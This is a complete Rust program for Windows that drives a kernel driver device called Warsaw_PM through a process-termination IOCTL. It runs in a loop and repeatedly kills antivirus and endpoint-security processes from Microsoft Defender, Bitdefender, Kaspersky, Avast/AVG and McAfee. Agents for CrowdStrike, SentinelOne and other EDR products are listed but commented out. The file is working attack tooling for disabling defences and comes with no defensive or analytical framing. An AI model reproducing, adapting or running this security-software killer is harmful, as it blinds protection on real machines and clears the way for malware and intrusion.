#![allow(non_snake_case, unused_imports, dead_code)]

use anyhow::{bail, Context, Result};
use std::ffi::{CStr, OsStr};
use std::mem;
use std::os::windows::ffi::OsStrExt;
use std::ptr;
use std::thread;
use std::time::Duration;
use winapi::shared::minwindef::{DWORD, LPVOID};
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::fileapi::{CreateFileW, OPEN_EXISTING};
use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};
use winapi::um::ioapiset::DeviceIoControl;
use winapi::um::tlhelp32::{
    CreateToolhelp32Snapshot, Process32First, Process32Next, PROCESSENTRY32, TH32CS_SNAPPROCESS,
};
use winapi::um::winnt::{GENERIC_READ, GENERIC_WRITE, HANDLE};

use winapi::um::consoleapi::{GetConsoleMode, ReadConsoleInputW, SetConsoleMode};
use winapi::um::wincon::{INPUT_RECORD, KEY_EVENT, KEY_EVENT_RECORD};
use winapi::um::winuser::VK_ESCAPE;
use winapi::shared::minwindef::{FALSE, TRUE};

const DEVICE_NAME: &str = r"\\.\Warsaw_PM";
const IOCTL_TERMINATE_PROCESS: DWORD = 0x22201C;
const PAYLOAD_BUFFER_SIZE: usize = 1036;
const SCAN_INTERVAL_MS: u64 = 1200;

const TARGET_PROCESSES: &[&str] = &[
    // ──────────────────────────────────────────────────────────────
    //                MICROSOFT DEFENDER / WINDOWS SECURITY
    // ──────────────────────────────────────────────────────────────
    "MsMpEng.exe",
    "MsMpEngCP.exe",
    "MpCmdRun.exe",
    "NisSrv.exe",
    "SecurityHealthService.exe",
    "SecurityHealthHost.exe",
    "SecurityHealthSystray.exe",
    "MsSense.exe",
    "MsSecFw.exe",
    "MsMpSigUpdate.exe",
    "MsMpGfx.exe",
    "MpDwnLd.exe",
    "MpSigStub.exe",
    "MsMpCom.exe",
    "MSASCui.exe",
    "WindowsDefender.exe",
    "WdNisSvc.exe",
    "WinDefend.exe",
    "smartscreen.exe",

    // ──────────────────────────────────────────────────────────────
    //                         BITDEFENDER
    // ──────────────────────────────────────────────────────────────
    "vsserv.exe",
    "bdservicehost.exe",
    "bdagent.exe",
    "bdwtxag.exe",
    "updatesrv.exe",
    "bdredline.exe",
    "bdscan.exe",
    "seccenter.exe",
    "bdsubwiz.exe",
    "bdmcon.exe",
    "bdtws.exe",
    "bdntwrk.exe",
    "bdfwfpf.exe",
    "bdrepair.exe",
    "bdwtxcfg.exe",
    "bdamsi.exe",
    "bdscriptm.exe",
    "bdfw.exe",
    "bdsandbox.exe",
    "bdenterpriseagent.exe",
    "bdappspider.exe",

    // ──────────────────────────────────────────────────────────────
    //                          KASPERSKY
    // ──────────────────────────────────────────────────────────────
    "avp.exe",
    "avpui.exe",
    "klnagent.exe",
    "klnsacsvc.exe",
    "klnfw.exe",
    "kavfs.exe",
    "kavfsslp.exe",
    "kavfsgt.exe",
    "kmon.exe",
    "ksde.exe",
    "ksdeui.exe",
    "kavtray.exe",
    "kpf4ss.exe",
    "kpm.exe",
    "ksc.exe",
    "klnupdate.exe",

    // ──────────────────────────────────────────────────────────────
    //                        AVAST / AVG
    // ──────────────────────────────────────────────────────────────
    "AvastSvc.exe",
    "AvastUI.exe",
    "AvastBrowserSecurity.exe",
    "aswEngSrv.exe",
    "aswToolsSvc.exe",
    "aswidsagent.exe",
    "avg.exe",
    "avgui.exe",
    "avgnt.exe",
    "avgsvc.exe",
    "avgidsagent.exe",
    "avgemc.exe",
    "avgmfapx.exe",
    "avgsvca.exe",
    "avgwdsvc.exe",
    "avgupsvc.exe",

    // ──────────────────────────────────────────────────────────────
    //                           MCAFEE
    // ──────────────────────────────────────────────────────────────
    "McAfeeService.exe",
    "McAPExe.exe",
    "mcshield.exe",
    "mfemms.exe",
    "mfeann.exe",
    "mfefire.exe",
    "mfemactl.exe",
    "mfehcs.exe",
    "mfemmseng.exe",
    "mfevtps.exe",
    "mcagent.exe",
    "mctray.exe",
    "mcuicnt.exe",
    "mcmscsvc.exe",
    "mcnasvc.exe",
    "mcpromgr.exe",
    "mcods.exe",
    "mctask.exe",
    "mcsacore.exe",
    "mcscript.exe",
    "mfeffcoreservice.exe",
    "mfetp.exe",
    "mfevtp.exe",

    // ──────────────────────────────────────────────────────────────
    //                   ADVANCED EDR TARGETS
    // ──────────────────────────────────────────────────────────────
    // Cortex XDR (Palo Alto)
    // "cortex-xdr.exe",
    // "traps.exe",
    // "cyserver.exe",

    // CrowdStrike Falcon
    // "csagent.exe",
    // "csfalconcontainer.exe",
    // "windowsSensor.exe",

    // SentinelOne
    // "sentinelagent.exe",
    // "sentinelstaticengine.exe",
    // "sedlauncher.exe",

    // Sophos Intercept X / XDR
    // "SophosED.exe",
    // "SophosInterceptX.exe",
    // "hitmanpro.alert.exe",

    // Bitdefender GravityZone / EDR
    // "product.exe",
    // "epag.exe",
    // "epconsole.exe",

    // ESET Business / EDR
    // "ekrn.exe",
    // "eset_protect.exe",
    // "era.exe",
];

struct WarsawProcessKiller {
    driver_handle: HANDLE,
}

impl WarsawProcessKiller {
    unsafe fn initialize_driver() -> Result<Self> {
        let wide_device_path: Vec<u16> = OsStr::new(DEVICE_NAME)
            .encode_wide()
            .chain(Some(0))
            .collect();

        let handle = CreateFileW(
            wide_device_path.as_ptr(),
            GENERIC_READ | GENERIC_WRITE,
            0,
            ptr::null_mut(),
            OPEN_EXISTING,
            0,
            ptr::null_mut(),
        );

        if handle == INVALID_HANDLE_VALUE {
            let error = GetLastError();
            bail!(
                "[CRITICAL] Failed to acquire control over Warsaw_PM device. Error code: 0x{:08X}",
                error
            );
        }

        println!("[SUCCESS] Warsaw_PM kernel interface acquired. Handle: {:p}", handle);

        Ok(Self { driver_handle: handle })
    }

    unsafe fn execute_termination(&self, target_pid: u32, process_name: &str) -> Result<()> {
        let mut payload_buffer = [0u8; PAYLOAD_BUFFER_SIZE];
        payload_buffer[0..4].copy_from_slice(&target_pid.to_le_bytes());

        let mut bytes_returned: DWORD = 0;

        let io_result = DeviceIoControl(
            self.driver_handle,
            IOCTL_TERMINATE_PROCESS,
            payload_buffer.as_mut_ptr() as LPVOID,
            payload_buffer.len() as DWORD,
            ptr::null_mut(),
            0,
            &mut bytes_returned,
            ptr::null_mut(),
        );

        if io_result == 0 {
            let error_code = GetLastError();
            bail!(
                "[TERMINATION FAILED] Process: {} | PID: {} | IOCTL error: 0x{:08X}",
                process_name,
                target_pid,
                error_code
            );
        }

        println!(
            "[ELIMINATED] Target neutralized: {} (PID: {})",
            process_name, target_pid
        );

        Ok(())
    }
}

impl Drop for WarsawProcessKiller {
    fn drop(&mut self) {
        if self.driver_handle != INVALID_HANDLE_VALUE {
            unsafe {
                CloseHandle(self.driver_handle);
            }
            println!("[SHUTDOWN] Warsaw_PM control channel terminated.");
        }
    }
}

unsafe fn locate_target_process(executable: &str) -> Result<u32> {
    let snapshot_handle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if snapshot_handle == INVALID_HANDLE_VALUE {
        bail!("[ERROR] Failed to create system process snapshot");
    }

    let mut process_entry: PROCESSENTRY32 = mem::zeroed();
    process_entry.dwSize = mem::size_of::<PROCESSENTRY32>() as DWORD;

    if Process32First(snapshot_handle, &mut process_entry) == 0 {
        CloseHandle(snapshot_handle);
        bail!("[ERROR] Failed to enumerate first process");
    }

    loop {
        let current_process_name = CStr::from_ptr(process_entry.szExeFile.as_ptr())
            .to_string_lossy()
            .to_lowercase();

        if current_process_name == executable.to_lowercase() {
            let pid = process_entry.th32ProcessID;
            CloseHandle(snapshot_handle);
            return Ok(pid);
        }

        if Process32Next(snapshot_handle, &mut process_entry) == 0 {
            break;
        }
    }

    CloseHandle(snapshot_handle);
    bail!("Target process not found: {}", executable)
}

fn main() -> Result<()> {
    println!();
    println!("╔════════════════════════════════════════════════════════════╗");
    println!("║               WARSAW_PM PROCESS ELIMINATION ENGINE         ║");
    println!("║          Persistent Security Software Terminator           ║");
    println!("║                  Version: Shadow Protocol                  ║");
    println!("╚════════════════════════════════════════════════════════════╝");
    println!();

    let killer = unsafe { WarsawProcessKiller::initialize_driver() }
        .context("Critical failure during driver initialization")?;

    println!("[STATUS] Entering infinite neutralization cycle...");
    println!("         Press ESC or Q to terminate (any key may work)\n");

    let stdin_handle = unsafe { winapi::um::winbase::GetStdHandle(winapi::um::winbase::STD_INPUT_HANDLE) };
    if stdin_handle == INVALID_HANDLE_VALUE {
        bail!("Failed to get stdin handle");
    }

    let mut original_mode: DWORD = 0;
    unsafe { GetConsoleMode(stdin_handle, &mut original_mode); }

    unsafe { SetConsoleMode(stdin_handle, original_mode & !(0x0001 | 0x0002)); }

    loop {
        let mut input_records: [INPUT_RECORD; 1] = unsafe { std::mem::zeroed() };
        let mut events_read: DWORD = 0;

        unsafe {
            ReadConsoleInputW(
                stdin_handle,
                input_records.as_mut_ptr(),
                1,
                &mut events_read,
            );
        }

        if events_read > 0 {
            let record = input_records[0];
            if record.EventType == KEY_EVENT as u16 {
                let key_event: KEY_EVENT_RECORD = unsafe { std::mem::transmute(record.Event) };
                if key_event.bKeyDown != 0 {
                    let vk = key_event.wVirtualKeyCode;
                    if vk == VK_ESCAPE as u16 || vk == 'Q' as u16 || vk == 'q' as u16 {
                        println!("[INFO] Exit on key press...");
                        break;
                    }
                }
            }
        }

        for &target_name in TARGET_PROCESSES {
            match unsafe { locate_target_process(target_name) } {
                Ok(pid) => {
                    println!("  -- Found {} - PID: {}", target_name, pid);
                    println!("[*] Killing {} ...", target_name);
                    let _ = unsafe { killer.execute_termination(pid, target_name) };
                }
                Err(_) => continue,
            }
        }

        thread::sleep(Duration::from_millis(SCAN_INTERVAL_MS));
    }

    unsafe { SetConsoleMode(stdin_handle, original_mode); }

    println!("[*] Cleaning up ...");
    println!("Successfully");

    Ok(())
}